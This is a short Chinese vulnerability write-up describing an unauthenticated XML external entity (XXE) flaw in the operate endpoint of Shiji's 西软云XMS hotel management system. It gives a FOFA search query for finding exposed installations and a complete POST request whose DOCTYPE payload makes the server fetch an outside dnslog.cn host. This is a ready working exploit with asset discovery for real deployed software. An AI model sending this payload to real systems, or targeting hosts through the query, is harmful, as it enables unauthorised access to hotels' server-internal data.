# 西软云XMS operate接口存在XXE漏洞

# 一、漏洞简介
西软云XMS是基于云平台数据中心开发的支持多酒店、多语言、多平台的酒店管理系统。致力于以新一代云架构为国内四，五星级中高端酒店提供灵活、高度整合酒店业务，助力酒店智能转型升级。2020的开年突变，对酒店行业来讲，无疑是天降横祸。覆巢之下，焉有完卵，对酒店管理系统企业来说，则是增量市场的红利几乎消失，所有品牌都得在存量市场里搏杀，生存和创新，是2020年的头号命题。西软云XMS /XopServerRS/rest/futurehotel/operate接口处存在XML实体注入漏洞，未经身份认证的攻击者可利用此漏洞获取服务器内部敏感数据，使系统处于极不安全状态。

# 二、影响版本
+ 西软云XMS

# 三、资产测绘
+ fofa`app="shiji-西软云XMS"`
+ 特征

![1711817597122-2208de63-eaca-439e-a2d3-83213cca9fb8.png](./img/9I5b4qVYQjvHjf2I/1711817597122-2208de63-eaca-439e-a2d3-83213cca9fb8-622096.png)

# 四、漏洞复现
```plain
POST /XopServerRS/rest/futurehotel/operate HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3157.54 Safari/537.36
Content-Length: 79
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: text/xml

<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://q26gls.dnslog.cn"> %remote;]>
```

![1711817615653-a87b144a-a77e-4cf1-b296-a5ff885a353e.png](./img/9I5b4qVYQjvHjf2I/1711817615653-a87b144a-a77e-4cf1-b296-a5ff885a353e-517502.png)



> 更新: 2024-04-20 22:27:26  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vt5rnzir8sgdr1pz>